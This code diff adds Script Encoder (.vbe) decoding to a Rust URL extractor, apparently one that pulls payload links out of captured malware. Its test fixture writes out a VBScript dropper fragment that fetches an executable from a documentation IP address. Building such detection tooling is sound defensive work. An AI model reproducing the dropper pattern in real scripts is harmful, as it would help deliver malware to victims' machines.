@@ -51,6 +51,18 @@ pub fn extract_urls(body: &[u8]) -> Vec<String> {
     let Ok(text) = std::str::from_utf8(body) else {
         return Vec::new();
     };
+    // Script Encoder (.vbe/.jse) is a fixed positional substitution, not encryption. A captured
+    // dropper used it to hide a plain `strFileURL = "http://..."` assignment - exactly the shape
+    // parsed below - so the follow-up payload was never queued. Decoding first closes that; a body
+    // with no envelope passes through unchanged. See `super::vbe`.
+    let decoded;
+    let text: &str = match super::vbe::decode(text) {
+        Some(d) => {
+            decoded = d;
+            &decoded
+        }
+        None => text,
+    };
 
     let vars = parse_assignments(text);
     let loops = parse_for_loops(text, &vars);
@@ -458,6 +470,25 @@ fn find_var_refs(s: &str) -> Vec<String> {
 #[cfg(test)]
 mod tests {
     use super::*;
+
+    // A Script-Encoded dropper hid its payload url from this extractor entirely: the body is
+    // scanned as plain text, and encoded text contains no `http://` token. Decoded, it is the
+    // ordinary assignment shape the extractor already handles. Documentation address, not the
+    // real host the captured sample pointed at.
+    #[test]
+    fn decodes_a_script_encoded_dropper_before_extracting() {
+        let plain = "Set WshShell = CreateObject(\"WScript.Shell\")\r\n\
+                     strFileURL = \"http://198.51.100.72/tmp2.exe\"\r\n\
+                     objXMLHTTP.open \"GET\", strFileURL, false\r\n";
+        let encoded = super::super::vbe::tests::encode(plain);
+        // Sanity: the encoded form must not contain the url in the clear, or this test proves
+        // nothing about decoding.
+        assert!(!encoded.contains("http://"), "fixture leaked the url in the clear");
+        assert_eq!(
+            extract_urls(encoded.as_bytes()),
+            vec!["http://198.51.100.72/tmp2.exe".to_string()]
+        );
+    }
 
     #[test]
     fn extracts_arch_urls_from_a_bins_script() {
